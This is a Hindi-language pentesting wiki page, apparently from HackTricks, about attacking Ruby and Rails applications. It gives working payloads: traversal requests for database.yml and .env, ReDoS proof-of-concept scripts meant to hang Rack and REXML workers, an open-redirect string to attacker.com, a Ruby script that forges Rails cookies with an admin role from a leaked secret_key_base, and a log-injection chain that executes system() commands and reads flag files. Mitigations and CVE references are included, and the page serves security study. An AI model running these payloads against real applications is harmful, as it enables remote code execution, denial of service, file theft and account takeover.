# Ruby ट्रिक्स

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड से RCE

जैसा कि [this article](https://www.offsec.com/blog/cve-2024-46986/) में समझाया गया है, `config/initializers/` जैसी संवेदनशील डायरेक्टरी में `.rb` फ़ाइल अपलोड करने से Ruby on Rails एप्लिकेशन में remote code execution (RCE) हो सकता है।

टिप्स:
- अन्य बूट/ईगर-लोड लोकेशंस जो ऐप स्टार्ट पर execute होते हैं, writable होने पर भी जोखिम पैदा करते हैं (उदा., `config/initializers/` क्लासिक मामला है)। यदि आप कोई arbitrary फ़ाइल अपलोड पाते हैं जो `config/` के अंतर्गत कहीं भी आ जाती है और बाद में evaluate/required की जाती है, तो बूट पर आप RCE प्राप्त कर सकते हैं।
- ऐसे dev/staging बिल्ड्स खोजें जो user-controlled फाइलों को container image में कॉपी करते हैं जहाँ Rails उन्हें बूट पर लोड करेगा।

## Active Storage image transformation → command execution (CVE-2025-24293)

जब एप्लिकेशन Active Storage को `image_processing` + `mini_magick` के साथ उपयोग करता है, और image transformation methods को untrusted parameters पास करता है, तो Rails के versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 में command injection संभव हो सकता है क्योंकि कुछ transformation methods गलती से default में allow थे।

- एक कमजोर पैटर्न इस तरह दिखता है:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
जहाँ `params[:t]` और/या `params[:v]` attacker-controlled हैं।

- टेस्टिंग के दौरान क्या आज़माएँ
- उन endpoints को पहचानें जो variant/processing options, transformation names, या arbitrary ImageMagick arguments स्वीकार करते हैं।
- संदिग्ध errors या execution side-effects के लिए `params[:t]` और `params[:v]` को fuzz करें। यदि आप method name को प्रभावित कर सकें या raw arguments पास कर सकें जो MiniMagick तक पहुँचें, तो आप image processor host पर code exec प्राप्त कर सकते हैं।
- यदि आपके पास केवल generated variants का read-access है, तो crafted ImageMagick operations के माध्यम से blind exfiltration का प्रयास करें।

- निवारण/डिटेक्शन
- यदि आप Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 के साथ Active Storage + `image_processing` + `mini_magick` और user-controlled transformations देखते हैं, तो इसे exploitable मानें। उन्नयन करने और methods/params के लिए सख्त allowlists लागू करने और एक hardened ImageMagick policy की सलाह दें।

## Rack::Static LFI / path traversal (CVE-2025-27610)

यदि target stack Rack middleware को सीधे या frameworks के माध्यम से उपयोग करता है, तो `rack` के versions prior to 2.2.13, 3.0.14, और 3.1.12 में `:root` unset/misconfigured होने पर `Rack::Static` के जरिए Local File Inclusion की अनुमति है। `PATH_INFO` में encoded traversal process working directory या किसी unexpected root के तहत फाइलें उजागर कर सकता है।

- ऐसे apps ढूंढें जो `Rack::Static` को `config.ru` या middleware stacks में mount करते हैं। static paths के खिलाफ encoded traversals आज़माएँ, उदाहरण के लिए:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
prefix को configured `urls:` से मेल करने के लिए adjust करें। यदि ऐप फाइल कंटेंट्स के साथ रिस्पॉन्ड करता है, तो संभवतः आपके पास resolved `:root` के अंतर्गत किसी भी चीज़ के लिए LFI है।

- Mitigation: Rack को upgrade करें; सुनिश्चित करें कि `:root` केवल public files की directory की ओर पॉइंट करे और स्पष्ट रूप से सेट हो।

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` और < `2.2.8.1` crafted `Content-Type: multipart/form-data` headers को पार्स करते समय असाधारण रूप से अधिक समय लेते थे। एक ही POST जिसमें एक विशाल `A=` parameter सूची हो सकती है, एक Puma/Unicorn worker को pegged कर सकती है और DoS या request queue starvation का कारण बन सकती है।

- Quick PoC (एक worker को hang कर देगा):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- यह किसी भी Rack-based स्टैक (Rails/Sinatra/Hanami/Grape) पर काम करता है। यदि यह nginx/haproxy के पीछे है और keep-alive है, तो workers को खत्म करने के लिए समानांतर में दोहराएँ।
- इसे parser को linear बनाकर patch किया गया है; `rack` gem version < `3.0.9.1` या < `2.2.8.1` देखें। आकलनों में यह बताएं कि WAFs शायद ही इसे ब्लॉक करें क्योंकि header syntactically valid है।

## REXML XML parser ReDoS (CVE-2024-49761)

REXML gem < 3.3.9 (Ruby 3.1 और उससे पहले) hex numeric character references को पार्स करते समय catastrophic backtracking करती है जब उनमें लंबे अंक के रन हों (उदा., `&#1111111111111x41;`)। REXML या उसे रैप करने वाली libraries (SOAP/XML API clients, SAML, SVG uploads) द्वारा प्रोसेस की गई कोई भी XML CPU exhaustion के लिए दुरुपयोग की जा सकती है।

XML पार्स करने वाले Rails endpoint के खिलाफ minimal trigger:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
यदि प्रक्रिया कुछ सेकंड के लिए व्यस्त रहती है और worker CPU spike करता है, तो यह संभवतः vulnerable है। Attack low bandwidth है और background jobs जो XML ingest करती हैं, उन्हें भी प्रभावित करता है।

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

`cgi` gem का उपयोग करने वाली ऐप्स (default in many Rack stacks) एक ही malicious header से फ्रीज़ हो सकती हैं:
- `CGI::Cookie.parse` super-linear था; huge cookie strings (हज़ारों delimiters) O(N²) व्यवहार trigger करते हैं.
- `CGI::Util#escapeElement` regex ने HTML escaping पर ReDoS की अनुमति दी.

दोनों मुद्दे `cgi` 0.3.5.1 / 0.3.7 / 0.4.2 में fixed हैं। pentests के लिए, एक विशाल `Cookie:` header भेजें या helper code को untrusted HTML फ़ीड करें और worker lockup देखें। Amplify करने के लिए keep-alive के साथ combine करें।

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

The `googlesign_in` gem < 1.3.0 (used for Google OAuth on Rails) ने `proceedto` parameter पर incomplete same-origin check किया। एक malformed URL जैसे `proceedto=//attacker.com/%2F..` यह check bypass कर देता है और user को off-site redirect करता है जबकि Rails flash/session cookies preserved रहती हैं।

Exploit flow:
1. Victim crafted Google Sign-In link पर क्लिक करता है जो attacker द्वारा host किया गया है।
2. Authentication के बाद, gem attacker-controlled domain पर redirect कर देता है, leaking flash notices या cookies में स्टोर कोई भी डेटा जो wildcard domain scoped है।
3. अगर app short-lived tokens या magic links को flash में store करता है, तो इसे account takeover में बदला जा सकता है।

टेस्टिंग के दौरान, grep Gemfile.lock for `googlesign_in` < 1.3.0 और malformed `proceedto` values आज़माएं। Location header और cookie reflection के जरिए पुष्टि करें।

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails cookies को encrypt और sign करता है उन keys के साथ जो `secret_key_base` से derive होती हैं। अगर वह value leaks (उदा. repo, logs, या misconfigured credentials में), तो आम तौर पर आप cookies को decrypt, modify, और re-encrypt कर सकते हैं। यह अक्सर authz bypass का कारण बनता है यदि app roles, user IDs, या feature flags cookies में स्टोर करता है।

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
नोट्स:
- पुराने ऐप्स शायद AES-256-CBC और salts `encrypted cookie` / `signed encrypted cookie`, या JSON/Marshal serializers का उपयोग करते हों। salts, cipher, और serializer को तदनुसार समायोजित करें।
- Compromise/assessment पर, `secret_key_base` को रोटेट करें ताकि सभी मौजूदा cookies अमान्य हो जाएँ।

## अन्य संदर्भ (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

जब कोई ऐप (अक्सर एक साधारण Rack/Sinatra/Rails endpoint) दोनों करती है:
- उपयोगकर्ता-नियंत्रित स्ट्रिंग को ठीक वैसे ही लॉग करता है, और
- बाद में उसी स्ट्रिंग से व्युत्पन्न path वाले फ़ाइल को `load` करता है (`Pathname#cleanpath` के बाद),

तो आप अक्सर लॉग को दूषित करके और फिर ऐप को उस लॉग फ़ाइल को `load` करने के लिए मजबूर करके remote code execution प्राप्त कर सकते हैं। मुख्य प्रिमिटिव्स:

- Ruby का `load` लक्षित फ़ाइल की सामग्री को फ़ाइल एक्सटेंशन की परवाह किए बिना Ruby के रूप में मूल्यांकन करता है। कोई भी पढ़ने योग्य टेक्स्ट फ़ाइल जिसकी सामग्री Ruby के रूप में पार्स हो जाए, उसे निष्पादित किया जाएगा।
- `Pathname#cleanpath` बिना filesystem को हिट किए `.` और `..` सेगमेंट्स को collapse कर देता है, जिससे path smuggling सक्षम होता है: attacker-controlled junk लॉगिंग के लिए prepended किया जा सकता है जबकि cleaned path अभी भी इच्छित फ़ाइल पर resolve होता है जिसे execute करना है (उदा., `../logs/error.log`)।

### न्यूनतम असुरक्षित पैटर्न
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### क्यों लॉग में मान्य Ruby हो सकता है
`Logger` इस तरह के prefix lines लिखता है:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
Ruby में, `#` starts a comment और `9/2/2025` is just arithmetic। वैध Ruby code इंजेक्ट करने के लिए आपको:
- अपनी payload को नई लाइन पर शुरू करें ताकि वह INFO line में `#` द्वारा commented out न हो; एक leading newline भेजें (`\n` या `%0A`)।
- INFO line द्वारा introduce किए गए dangling `[` को बंद करें। एक सामान्य ट्रिक है `]` से शुरू करना और वैकल्पिक रूप से parser को खुश करने के लिए `][0]=1` जोड़ना।
- फिर arbitrary Ruby रखें (उदा., `system(...)`)।

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### एक ही स्ट्रिंग जो दोनों करती है: code को log करना और log path पर resolve होना
हम एक attacker-controlled string चाहते हैं जो:
- जब logged raw किया जाए, तो इसमें हमारा Ruby payload मौजूद हो, और
- जब `Pathname.new(<input>).cleanpath` से गुज़रे, तो यह `../logs/error.log` पर resolve हो, ताकि बाद का `load` उसी just-poisoned log file को execute कर दे।

`Pathname#cleanpath` schemes को ignore करता है और traversal components को collapse कर देता है, इसलिए निम्नलिखित काम करता है:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- `://` से पहले `#` यह सुनिश्चित करता है कि जब लॉग निष्पादित होगा तो Ruby tail को अनदेखा कर दे, जबकि `cleanpath` फिर भी समाप्ति हिस्से को `../logs/error.log` तक घटा देता है।
- अग्रिम नई पंक्ति INFO लाइन से बाहर निकाल देती है; `]` लटकते हुए ब्रैकेट को बंद कर देता है; `][0]=1` पार्सर को संतुष्ट करता है।

### End-to-end exploitation
1. बैकअप स्क्रिप्ट नाम के रूप में निम्न भेजें (यदि आवश्यक हो तो पहले newline को URL-encode करें जैसे `%0A`):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. ऐप आपकी कच्ची स्ट्रिंग को `logs/error.log` में लॉग करता है।
3. ऐप `cleanpath` की गणना करता है जो `../logs/error.log` पर resolve होता है और उस पर `load` कॉल करता है।
4. Ruby लॉग में आपने इंजेक्ट किया हुआ कोड निष्पादित कर देता है।

CTF-like environment में किसी फ़ाइल को exfiltrate करने के लिए:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (पहला कैरेक्टर एक नई पंक्ति है):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## संदर्भ

- [Rails सुरक्षा घोषणा: CVE-2025-24293 Active Storage असुरक्षित रूपांतरण विधियाँ (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub अधिसूचना: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath दस्तावेज़](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Ruby में load कैसे काम करता है](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS अधिसूचना (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby सुरक्षा अधिसूचनाएँ — CGI / URI के लिए (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
